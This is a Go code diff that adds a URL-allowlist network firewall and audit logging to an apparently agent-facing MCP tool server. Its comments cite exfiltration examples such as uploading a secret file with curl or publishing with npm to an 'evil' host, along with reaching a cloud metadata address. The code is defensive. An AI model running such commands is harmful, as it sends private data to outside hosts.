@@ -193,6 +193,57 @@ func logNetworkCall(ctx context.Context, toolName string, args map[string]interf
 		logModel(ctx), sessionID, toolName, netLogArgs(args))
 }
 
+// auditNetworkCall writes the per-URL record the network firewall emits.
+// Same pipe-delimited, single-line, stderr format as logNetworkCall, with "NET"
+// in the tool column and the decision as its own field, so one grep on
+// "|NET|" lists every URL the agent tried and whether it was permitted:
+//
+//   <UTC-time>|<model>|<session-id>|NET|<allowed|denied|would-deny>|<target>|<reason>
+//
+// "would-deny" is the report-only mode: no ALLOWED_URL_PTN is configured, so the
+// firewall records the decision it would have made without breaking existing
+// setups. Always emitted BEFORE the request is issued — same reason the tool-call
+// log is: an audit trail has to record attempts, not just successes.
+func auditNetworkCall(ctx context.Context, raw, normalized, reason string) {
+	var sessionID = "-"
+	if cs := server.ClientSessionFromContext(ctx); cs != nil {
+		sessionID = cs.SessionID()
+	}
+	var verdict = "allowed"
+	if reason != "" {
+		verdict = "would-deny"
+		if netPolicy.Enforce {
+			verdict = "denied"
+		}
+	}
+	// The URL is logged as-is (normalized), never with any userinfo: a token
+	// pasted into a URL must not spread into the audit trail beyond the URL itself.
+	fmt.Fprintf(os.Stderr, "%s|%s|%s|NET|%s|%s|%s\n",
+		time.Now().UTC().Format("2006-01-02T15:04:05Z"),
+		logModel(ctx), sessionID, verdict,
+		netLogTarget(netLogPick(normalized, raw)),
+		strings.ReplaceAll(reason, "\n", " "))
+}
+
+// netLogPick prefers the normalized URL (the one that actually gets dialed) and
+// falls back to the raw string when parsing failed, so a rejected junk URL is
+// still auditable.
+func netLogPick(normalized, raw string) string {
+	if normalized != "" {
+		return normalized
+	}
+	return raw
+}
+
+// netLogTarget truncates a URL so a giant query string cannot flood the log,
+// matching netLogArgs' role for tool arguments.
+func netLogTarget(target string) string {
+	if len(target) > netLogArgLimit {
+		return target[:netLogArgLimit] + "...[truncated]"
+	}
+	return target
+}
+
 // defaultLoopGuard is process-wide since a given MCP server process is
 // effectively one active session's worth of tool traffic.
 var defaultLoopGuard = NewLoopGuard()
@@ -433,7 +484,17 @@ func (t *BaseToolManager) execCommand(ctx context.Context, request mcp.CallToolR
 		}
 	}
 
-	// 6) Execute the resolved absolute path with a context/timeout. No shell.
+	// 6) Network firewall: the allowlisted programs are allowed to reach the network
+	//    (curl, wget, git, ssh, npm ...), but every URL and host target written in the
+	//    command must pass the allowlist first. checkCommandNetworkTargets parses them
+	//    out of the line and audits each one; any target that fails denies the whole
+	//    command. This is what closes `curl -T ./secret http://evil` and
+	//    `npm publish --registry http://evil` — a permitted program, an unlisted target.
+	if res, err := checkCommandNetworkTargets(ctx, command, program); err != nil {
+		return res, err
+	}
+
+	// 7) Execute the resolved absolute path with a context/timeout. No shell.
 	execCtx, cancel := context.WithTimeout(ctx, 2*time.Minute)
 	defer cancel()
 	runCmd := exec.CommandContext(execCtx, abs, argv[1:]...)
@@ -544,6 +605,16 @@ func (t *BaseToolManager) runTerminalCommand(ctx context.Context, request mcp.Ca
 		if res, err := t.checkPath(strings.TrimSpace(cmd)); err != nil {
 			return res, err
 		}
+	}
+
+	// Network firewall. run_terminal_command runs a real shell, so this is the
+	// widest surface: every URL, and every bare host target (scp host:/path,
+	// rsync host:path, ssh host, git remote add origin host, curl 169.254...) in
+	// the line is parsed out and matched against ALLOWED_URL_PTN before anything
+	// is executed. program is "" here because shlex cannot describe a shell line,
+	// so host-taking programs are detected by pattern instead.
+	if res, err := checkCommandNetworkTargets(ctx, command, ""); err != nil {
+		return res, err
 	}
 
 	workingDir := wdir.Dir
@@ -787,7 +858,14 @@ func (t *BaseToolManager) fetchUrl(ctx context.Context, request mcp.CallToolRequ
 		return mcp.NewToolResultError("Missing or invalid 'url' parameter"), nil
 	}
 
-	markdownText, err := fetchAndConvert(url)
+	// Network firewall: the URL is checked (and audited) before a byte is sent,
+	// and the fetch runs on the guarded client so a redirect to an unlisted host
+	// is denied too, not just the URL the caller typed.
+	if res, err := checkURLArgument(ctx, url); err != nil {
+		return res, err
+	}
+
+	markdownText, err := fetchAndConvert(url, guardedClient())
 	if err != nil {
 		return mcp.NewToolResultError(err.Error()), nil
 	}
@@ -808,12 +886,22 @@ func (t *BaseToolManager) fetchUrl(ctx context.Context, request mcp.CallToolRequ
 
 func (t *BaseToolManager) httpRequest(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
 	logNetworkCall(ctx, "http_request", request.GetArguments())
-	args := request.GetArguments()
-	method := args["method"].(string)
-	url := args["url"].(string)
-	body := ""
-	if b, ok := args["body"].(string); ok {
-		body = b
+	// argString instead of args[...].(string): on the HTTP transport a malformed
+	// request used to panic the whole server (REVIEW.md item 8) — and a panicking
+	// tool handler is a denial of service the firewall is supposed to prevent.
+	var method = argString(request, "method")
+	var url = argString(request, "url")
+	var body = argString(request, "body")
+	if method == "" {
+		return mcp.NewToolResultText("[ERROR]"), fmt.Errorf("[ERROR] http_request: missing or invalid 'method'")
+	}
+
+	// Network firewall — see network-firewall.go for the policy. The audit line for
+	// the URL is written before the request is built, so a denied call is still
+	// recorded. The request then runs on guardedClient(), which re-checks every
+	// redirect hop.
+	if res, err := checkURLArgument(ctx, url); err != nil {
+		return res, err
 	}
 
 	var req *http.Request
@@ -827,7 +915,7 @@ func (t *BaseToolManager) httpRequest(ctx context.Context, request mcp.CallToolR
 		return mcp.NewToolResultErrorFromErr("unable to create request", err), nil
 	}
 
-	client := &http.Client{}
+	client := guardedClient()
 	resp, err := client.Do(req)
 	if err != nil {
 		return mcp.NewToolResultErrorFromErr("unable to execute request", err), nil
